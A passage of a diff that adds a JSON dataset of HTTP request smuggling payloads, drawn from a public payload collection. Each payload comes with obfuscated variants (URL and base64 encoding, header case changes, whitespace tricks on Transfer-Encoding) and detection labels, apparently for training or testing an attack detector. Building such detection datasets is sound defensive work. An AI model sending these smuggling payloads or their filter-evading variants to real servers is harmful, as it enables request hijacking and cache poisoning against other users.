@@ -1,0 +1,2897 @@
+[
+  {
+    "id": "raw_hsmug_00001__obf01",
+    "payload": "POST%20%2F%20HTTP%2F1.1%0AHost%3A%20vulnerable-website.com%0AContent-Length%3A%2013%0ATransfer-Encoding%3A%20chunked%0A%0A0%0A%0ASMUGGLED",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "f96ddc2170a95507df8862b728f0b7f70bc5f09788c5aa08044ee9c78c3701c3",
+    "original_id": "raw_hsmug_00001",
+    "original_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
+    "obfuscated_payload": "POST%20%2F%20HTTP%2F1.1%0AHost%3A%20vulnerable-website.com%0AContent-Length%3A%2013%0ATransfer-Encoding%3A%20chunked%0A%0A0%0A%0ASMUGGLED",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62162977,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00001__obf02",
+    "payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IHZ1bG5lcmFibGUtd2Vic2l0ZS5jb20KQ29udGVudC1MZW5ndGg6IDEzClRyYW5zZmVyLUVuY29kaW5nOiBjaHVua2VkCgowCgpTTVVHR0xFRA==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "f96ddc2170a95507df8862b728f0b7f70bc5f09788c5aa08044ee9c78c3701c3",
+    "original_id": "raw_hsmug_00001",
+    "original_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
+    "obfuscated_payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IHZ1bG5lcmFibGUtd2Vic2l0ZS5jb20KQ29udGVudC1MZW5ndGg6IDEzClRyYW5zZmVyLUVuY29kaW5nOiBjaHVua2VkCgowCgpTTVVHR0xFRA==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 62163986,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00001__obf03",
+    "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding :\tchunked\n\n0\n\nSMUGGLED",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "f96ddc2170a95507df8862b728f0b7f70bc5f09788c5aa08044ee9c78c3701c3",
+    "original_id": "raw_hsmug_00001",
+    "original_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
+    "obfuscated_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding :\tchunked\n\n0\n\nSMUGGLED",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value",
+      "hsmug_te_space_before_colon"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 62164995,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00001__obf04",
+    "payload": "POST %2F%20HTTP%2F1.1\nHost: vulnerable-website.com%0AContent-Length: 13\nTransfer-Encoding%20%3A%20chunked%0A%0A0%0A%0ASMUGGLED",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "f96ddc2170a95507df8862b728f0b7f70bc5f09788c5aa08044ee9c78c3701c3",
+    "original_id": "raw_hsmug_00001",
+    "original_payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
+    "obfuscated_payload": "POST %2F%20HTTP%2F1.1\nHost: vulnerable-website.com%0AContent-Length: 13\nTransfer-Encoding%20%3A%20chunked%0A%0A0%0A%0ASMUGGLED",
+    "obfuscation_chain": [
+      "hsmug_te_space_before_colon",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62166004,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00002__obf01",
+    "payload": "POS%54 / HTTP/%31.1",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5365f4e322d7c667294ae3c0d46c5e8ce25ea84ae5d26f96d06ee24752871460",
+    "original_id": "raw_hsmug_00002",
+    "original_payload": "POST / HTTP/1.1",
+    "obfuscated_payload": "POS%54 / HTTP/%31.1",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62262980,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00002__obf02",
+    "payload": "UE9TVCAvIEhUVFAvMS4x",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5365f4e322d7c667294ae3c0d46c5e8ce25ea84ae5d26f96d06ee24752871460",
+    "original_id": "raw_hsmug_00002",
+    "original_payload": "POST / HTTP/1.1",
+    "obfuscated_payload": "UE9TVCAvIEhUVFAvMS4x",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 62263989,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00002__obf03",
+    "payload": "POST / HTTP\\u002f1.1",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5365f4e322d7c667294ae3c0d46c5e8ce25ea84ae5d26f96d06ee24752871460",
+    "original_id": "raw_hsmug_00002",
+    "original_payload": "POST / HTTP/1.1",
+    "obfuscated_payload": "POST / HTTP\\u002f1.1",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 62264998,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00002__obf04",
+    "payload": "POST%2520%252F%2520HTTP%252F1.1",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5365f4e322d7c667294ae3c0d46c5e8ce25ea84ae5d26f96d06ee24752871460",
+    "original_id": "raw_hsmug_00002",
+    "original_payload": "POST / HTTP/1.1",
+    "obfuscated_payload": "POST%2520%252F%2520HTTP%252F1.1",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 62266007,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00003__obf01",
+    "payload": "Cont%65n%74-Length: 13",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ac4564be1f325fcea9631d9082af2f2238df991f33f7dd47f65fe4aaa7d9c2c1",
+    "original_id": "raw_hsmug_00003",
+    "original_payload": "Content-Length: 13",
+    "obfuscated_payload": "Cont%65n%74-Length: 13",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62362983,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00003__obf02",
+    "payload": "Q29udGVudC1MZW5ndGg6IDEz",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ac4564be1f325fcea9631d9082af2f2238df991f33f7dd47f65fe4aaa7d9c2c1",
+    "original_id": "raw_hsmug_00003",
+    "original_payload": "Content-Length: 13",
+    "obfuscated_payload": "Q29udGVudC1MZW5ndGg6IDEz",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 62363992,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00003__obf03",
+    "payload": "COntENt-lENgTh: 13",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ac4564be1f325fcea9631d9082af2f2238df991f33f7dd47f65fe4aaa7d9c2c1",
+    "original_id": "raw_hsmug_00003",
+    "original_payload": "Content-Length: 13",
+    "obfuscated_payload": "COntENt-lENgTh: 13",
+    "obfuscation_chain": [
+      "header_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 62365001,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00003__obf04",
+    "payload": "cOnTeNt-lENgTH:%2013",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ac4564be1f325fcea9631d9082af2f2238df991f33f7dd47f65fe4aaa7d9c2c1",
+    "original_id": "raw_hsmug_00003",
+    "original_payload": "Content-Length: 13",
+    "obfuscated_payload": "cOnTeNt-lENgTH:%2013",
+    "obfuscation_chain": [
+      "header_case",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62366010,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00004__obf01",
+    "payload": "Transfer-Encoding%253A%2520chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "97b5a6c57e7aa818170c73417d2025caf061834845eecfb8c5741c4faad3bc04",
+    "original_id": "raw_hsmug_00004",
+    "original_payload": "Transfer-Encoding: chunked",
+    "obfuscated_payload": "Transfer-Encoding%253A%2520chunked",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 62462986,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00004__obf02",
+    "payload": "VHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQ=",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "97b5a6c57e7aa818170c73417d2025caf061834845eecfb8c5741c4faad3bc04",
+    "original_id": "raw_hsmug_00004",
+    "original_payload": "Transfer-Encoding: chunked",
+    "obfuscated_payload": "VHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQ=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 62463995,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00004__obf03",
+    "payload": "Transfer-Encoding :\tchunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "97b5a6c57e7aa818170c73417d2025caf061834845eecfb8c5741c4faad3bc04",
+    "original_id": "raw_hsmug_00004",
+    "original_payload": "Transfer-Encoding: chunked",
+    "obfuscated_payload": "Transfer-Encoding :\tchunked",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value",
+      "hsmug_te_space_before_colon"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 62465004,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00004__obf04",
+    "payload": "VHJhbnNmZXItRW5jb2Rpbmc6CWNodW5rZWQ=",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "97b5a6c57e7aa818170c73417d2025caf061834845eecfb8c5741c4faad3bc04",
+    "original_id": "raw_hsmug_00004",
+    "original_payload": "Transfer-Encoding: chunked",
+    "obfuscated_payload": "VHJhbnNmZXItRW5jb2Rpbmc6CWNodW5rZWQ=",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 62466013,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00005__obf01",
+    "payload": "POST %2F%20HTTP/1.1%0AHost%3A%20domain.example.com%0AConnection%3A%20keep-alive%0AContent-Type%3A application%2Fx-www-form-urlencoded%0AContent-Length%3A%206%0ATransfer-Encoding%3A chunked\n\n0%0A\nG",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "55358cfa644431092dada289183a8f3f42f52f27bc2d4d4692fb761041866a37",
+    "original_id": "raw_hsmug_00005",
+    "original_payload": "POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG",
+    "obfuscated_payload": "POST %2F%20HTTP/1.1%0AHost%3A%20domain.example.com%0AConnection%3A%20keep-alive%0AContent-Type%3A application%2Fx-www-form-urlencoded%0AContent-Length%3A%206%0ATransfer-Encoding%3A chunked\n\n0%0A\nG",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62562989,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00005__obf02",
+    "payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IGRvbWFpbi5leGFtcGxlLmNvbQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbnRlbnQtTGVuZ3RoOiA2ClRyYW5zZmVyLUVuY29kaW5nOiBjaHVua2VkCgowCgpH",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "55358cfa644431092dada289183a8f3f42f52f27bc2d4d4692fb761041866a37",
+    "original_id": "raw_hsmug_00005",
+    "original_payload": "POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG",
+    "obfuscated_payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IGRvbWFpbi5leGFtcGxlLmNvbQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbnRlbnQtTGVuZ3RoOiA2ClRyYW5zZmVyLUVuY29kaW5nOiBjaHVua2VkCgowCgpH",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 62563998,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00005__obf03",
+    "payload": "POST / HTTP/1.1\nhost: domain.example.com\nConnection: keep-alive\nCONtent-typE: application/x-www-form-urlencoded\ncoNTenT-LEngTh: 6\nTransfer-Encoding : chunked\n\n0\n\nG",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "55358cfa644431092dada289183a8f3f42f52f27bc2d4d4692fb761041866a37",
+    "original_id": "raw_hsmug_00005",
+    "original_payload": "POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG",
+    "obfuscated_payload": "POST / HTTP/1.1\nhost: domain.example.com\nConnection: keep-alive\nCONtent-typE: application/x-www-form-urlencoded\ncoNTenT-LEngTh: 6\nTransfer-Encoding : chunked\n\n0\n\nG",
+    "obfuscation_chain": [
+      "header_case",
+      "hsmug_te_space_before_colon"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 62565007,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00005__obf04",
+    "payload": "POST / HTTP/1.1\nHost: domain.ex%61mple.com\n%43onnection: %6Bee%70-aliv%65\n%43o%6Etent-Type: app%6Cica%74ion/x-www-form-urlencoded\nConten%74%2DLength: 6\n%54ransf%65r-Encodi%6Eg:\tchu%6Eke%64\n\n0\n\n%47",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "55358cfa644431092dada289183a8f3f42f52f27bc2d4d4692fb761041866a37",
+    "original_id": "raw_hsmug_00005",
+    "original_payload": "POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG",
+    "obfuscated_payload": "POST / HTTP/1.1\nHost: domain.ex%61mple.com\n%43onnection: %6Bee%70-aliv%65\n%43o%6Etent-Type: app%6Cica%74ion/x-www-form-urlencoded\nConten%74%2DLength: 6\n%54ransf%65r-Encodi%6Eg:\tchu%6Eke%64\n\n0\n\n%47",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value",
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62566016,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00006__obf01",
+    "payload": "Content-Le%6Egt%68: 6",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0411b968d234d1c399fcd622800757673d02d2d593d293dadce95148a28e5fde",
+    "original_id": "raw_hsmug_00006",
+    "original_payload": "Content-Length: 6",
+    "obfuscated_payload": "Content-Le%6Egt%68: 6",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62662992,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00006__obf02",
+    "payload": "Q29udGVudC1MZW5ndGg6IDY=",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0411b968d234d1c399fcd622800757673d02d2d593d293dadce95148a28e5fde",
+    "original_id": "raw_hsmug_00006",
+    "original_payload": "Content-Length: 6",
+    "obfuscated_payload": "Q29udGVudC1MZW5ndGg6IDY=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 62664001,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00006__obf03",
+    "payload": "conTent-LenGTH: 6",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0411b968d234d1c399fcd622800757673d02d2d593d293dadce95148a28e5fde",
+    "original_id": "raw_hsmug_00006",
+    "original_payload": "Content-Length: 6",
+    "obfuscated_payload": "conTent-LenGTH: 6",
+    "obfuscation_chain": [
+      "header_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 62665010,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00006__obf04",
+    "payload": "Content-Length%3A%206",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0411b968d234d1c399fcd622800757673d02d2d593d293dadce95148a28e5fde",
+    "original_id": "raw_hsmug_00006",
+    "original_payload": "Content-Length: 6",
+    "obfuscated_payload": "Content-Length%3A%206",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 62666019,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00007__obf01",
+    "payload": "POST%2520%252F%2520HTTP%252F1.1%250AHost%253A%2520vulnerable-website.com%250AContent-Length%253A%25203%250ATransfer-Encoding%253A%2520chunked%250A%250A8%250ASMUGGLED%250A0",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
